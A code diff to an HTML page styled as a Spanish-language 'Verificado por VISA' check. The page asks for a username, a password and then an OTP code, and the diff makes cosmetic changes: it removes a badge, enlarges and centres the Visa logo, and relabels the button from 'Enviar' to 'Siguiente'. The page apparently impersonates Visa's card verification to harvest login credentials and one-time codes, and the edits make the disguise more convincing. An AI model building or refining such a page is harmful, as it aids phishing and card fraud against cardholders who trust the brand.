@@ -47,33 +47,16 @@
         .header {
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
+            justify-content: center;
+            margin-bottom: 24px;
             padding-bottom: 16px;
             border-bottom: 1px solid var(--visa-border);
         }
 
-        .visa-logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
         .visa-logo img {
-            height: 38px;
+            height: 48px;
             width: auto;
             display: block;
-        }
-
-        .visa-badge {
-            background: var(--visa-blue);
-            color: white;
-            font-size: 0.7rem;
-            font-weight: 700;
-            padding: 4px 14px;
-            border-radius: 20px;
-            letter-spacing: 0.8px;
-            text-transform: uppercase;
         }
 
         /* BANNER DE SEGURIDAD - ESTILO VISA */
@@ -439,19 +422,19 @@
                 width: 100%;
             }
 
-            .header {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 8px;
-            }
-
             .form-footer {
                 flex-direction: column;
                 align-items: flex-start;
             }
 
             .visa-logo img {
-                height: 30px;
+                height: 40px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .visa-logo img {
+                height: 34px;
             }
         }
     </style>
@@ -469,7 +452,6 @@
         <div class="header">
             <div class="visa-logo">
                 <img src="image.png" alt="Verificado por VISA" />
-                <span class="visa-badge">Verificado</span>
             </div>
         </div>
 
@@ -550,7 +532,7 @@
             <!-- BOTÓN -->
             <div class="button-group">
                 <button type="submit" class="btn btn-primary" id="submitButton">
-                    <span id="buttonText">Enviar</span>
+                    <span id="buttonText">Siguiente</span>
                 </button>
             </div>
         </form>
@@ -864,7 +846,7 @@
         function ocultarOTP() {
             otpSection.classList.remove('visible');
             pasoActual = 'credenciales';
-            buttonText.textContent = 'Enviar';
+            buttonText.textContent = 'Siguiente';
             confirmationInput.value = '';
             confirmationInput.disabled = true;
             statusMessage.className = 'status-message';
@@ -877,7 +859,7 @@
             statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            buttonText.textContent = pasoActual === 'otp' ? 'Verificar OTP' : 'Enviar';
+            buttonText.textContent = pasoActual === 'otp' ? 'Verificar OTP' : 'Siguiente';
         }
 
         function mostrarExito(mensaje) {
@@ -895,7 +877,7 @@
             solicitudId = null;
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            buttonText.textContent = 'Enviar';
+            buttonText.textContent = 'Siguiente';
             usernameInput.value = '';
             passwordInput.value = '';
             confirmationInput.value = '';
